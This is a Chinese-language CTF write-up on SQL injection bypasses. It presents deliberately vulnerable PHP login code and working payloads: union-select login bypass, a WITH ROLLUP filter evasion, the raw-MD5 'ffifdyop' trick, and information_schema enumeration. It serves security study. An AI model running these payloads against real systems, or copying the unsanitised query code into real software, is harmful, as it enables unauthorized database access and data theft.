### SQL注入绕过

#### 例题1
```php
<?php
if($_POST[user] && $_POST[pass]) {
	//省略了mysql连接过程
    $user = $_POST[user];
    $pass = md5($_POST[pass]);

    $sql = "select pw from php where user='$user'";
    #使用union时，查询出来的列名是第一个被查询的表对应的列名
    $query = mysql_query($sql);
    if (!$query) {
        printf("Error: %s\n", mysql_error($conn));
        exit();
    }
    $row = mysql_fetch_array($query, MYSQL_ASSOC);
    
    if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
        echo "<p>Logged in! Key:************** </p>";
    }
    else {
        echo("<p>Log in failure!</p>");
    }
}
?>
```
#### 分析
该文件接受user和pass两个参数，通过构造合适的sql语句进行SQL注入成功登录即可获得key。代码中没有过滤任何SQL语句，因此可以有多种方法进行payload的构造。

#### payload
```
user=' union select md5(1)#
pass=1 
```

#### 例题2
>题目地址:http://www.shiyanbar.com/ctf/1940
#### 代码
```php
<?php
error_reporting(0);
function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   
        print "水可载舟，亦可赛艇！";
        exit();
    }
}
//执行的开始部分
$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){ 
    AttackFilter($key,$value,$filter);
}

//连接语句省略
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql); 
if (mysql_num_rows($query) == 1) { 
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
	print "一颗赛艇！";
}
mysql_close($con);
?>
```
#### 分析
该PHP文件接收两个参数，uname和pwd。文件中包含了对一些SQL关键字和操作符的过滤，没有限制limit,with,rollup,offset等关键字。

根据代码中的条件，只有查询结果中只有1行，且输入密码必须和查询的密码对应才可以得到flag。

这里可以借助with rollup操作来实现SQL注入，该关键字可以将行中每一列的结果进行汇总，如果是数字，得到数字的和；如果是非数字字符串，得到0；

#### payload
```html
uname=1' or 1=1 group by pwd with rollup limit 1 offset 2#
pwd=
<!--pwd为空，uname的最终显示起始行是试出来的-->
<!--payload解释:得到所有用户名和密码，将密码汇总，选出null对应的行-->
```

#### 参考文章
with rollup
>https://www.cnblogs.com/phpper/p/9384614.html

limit宇offset
>https://blog.csdn.net/l1212xiao/article/details/80520330

#### 例题3
>http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php,后台登录

#### 代码

```php
$password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result=mysqli_query($link,$sql);
if(mysqli_num_rows($result)>0){
    echo 'flag is :'.$flag;
}
else{
    echo '密码错误!';
}
```

#### 分析
该文件只接收一个password参数。如果想得到flag，必须保证密码的MD5值和用户输入的MD5值相同。值得注意的是，该处的MD5函数与常规的用法不太一致，其第二个参数为true，表示返回16字节的原始二进制格式的内容，而不是其对应的一个32位的数字字符串。

因此，如果产生的二进制内容在显示为字符串时，如果能出现'or'axx（a为一个非0的数字，x为任意字符）,则可以构造一个恒为真的SQL语句。

比较巧的是，该文件的文件名经过加密后正好可以产生一个比较合适的字符串。
```txt
'or'6�]��!r,��b
```
#### payload

```txt
password=ffifdyop
```

#### 例题4
>tips:非常适合新手的一道题，题目来自于攻防世界web进阶题newscenter

#### 说明
此题无代码，需要盲注。

测试中发现报错不会有回显，但是也没有过滤任何常用的SQL语句，不是难题。

#### 分析
这里准备采用联合查询的方式获得flag，首先构造了1个payload
```txt
' and 0 union select 1#
```
在firefox下直接返回一个空白页，猜测可能的原因是联合查询的列数不匹配导致查询结果出错。

一点点的增加查询的列数，发现列数为3时可以。
```txt
' and 0 union select 1,2,3#
```
![行数测试](image\column_test_3.png)
接下来查询表名
```txt
' and 0 union select 1,2,table_name from information_schema.tables#
```
![查询表名](image\column_name.png)
得到了表名称secret_table
接下来查询列名
```txt
' and 0 union select 1,2,column_name from information_schema.columns where table_name='secret_table'#
```
得到了列名fl4g

查询fl4g中的内容即可得到flag
```txt
' and 0 union select 1,2,fl4g from secret_table#
```

#### 拓展
这里拓展一些关于select后面加数字的一些内容。

#### SQL注入常用函数

1.database()

该函数可以显示当前正在使用的数据库库名。

2.mid()

该函数可以从指定的字段中提取出字段的内容。

mid(column_name,start[,length])
```sql
select mid(name,1) from user;
/*start要求最小从1开始*/
/*从password这一列的每一个元素的第一个字符开始截取*/
/*注意得到的是整整一列的内容*/
```
eg:

select * from user;
| name | password |
| ------ | ------ |
| admin | admin |
| root | root |

select mid(name,1,2);

|name|
|---|
|ad|
|ro|

3.ord()

该函数用于获得某个字符串最开始的字符的ASCII值。

4.ascii()

目前未发现与ord的不同。